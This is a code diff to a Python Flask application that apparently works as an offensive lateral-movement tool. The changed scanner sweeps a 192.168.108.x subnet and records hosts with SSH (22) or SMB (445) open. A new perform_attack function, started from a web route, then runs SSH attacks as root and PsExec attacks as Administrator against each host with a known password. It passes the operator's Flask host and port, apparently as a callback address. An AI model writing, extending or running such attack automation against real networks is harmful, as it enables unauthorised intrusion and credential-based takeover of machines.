@@ -162,6 +162,8 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
         subnet (str): The subnet to scan, e.g., "192.168.108.".
         ports (list): List of ports to scan, e.g., [22, 445].
     """
+    ssh_hosts = []
+    smb_hosts = []
     def scan_host(ip):
         for port in ports:
             try:
@@ -170,8 +172,10 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
                     result = s.connect_ex((ip, port))
                     if result == 0:
                         if port == 22:
+                            ssh_hosts.append(ip)
                             print(f"[INFO] SSH (port 22) open on {ip}. Potential SSH server.")
                         elif port == 445:
+                            smb_hosts.append(ip)
                             print(f"[INFO] SMB (port 445) open on {ip}. Potential SMB service.")
                     else:
                         # print(f"[DEBUG] Port {port} closed on {ip}.")
@@ -180,10 +184,22 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
                 print(f"[ERROR] Error scanning {ip}:{port} - {e}")
 
     print("[INFO] Starting scan...")
-    with ThreadPoolExecutor(max_workers=10) as executor:
+    with ThreadPoolExecutor(max_workers=20) as executor:
         ips = [f"{subnet}{i}" for i in range(1, 255)]
         executor.map(scan_host, ips)
     print("[INFO] Scan completed.")
+
+    return ssh_hosts, smb_hosts
+
+def perform_attack():
+    ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
+    for host in ssh_hosts:
+        print(f"Attempting ssh attack for {host}")
+        attacks.ssh("root", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
+    for host in smb_hosts:
+        print(f"Attempting smb attack for {host}")
+        attacks.psexec("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
+    
 
 @app.route('/')
 def home():
@@ -243,9 +259,6 @@ def start_attack():
     # Call your Python function here
     perform_attack()
     return "Attack initiated successfully!"
-
-def perform_attack():
-    ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
 
 @app.route('/logout')
 def logout():
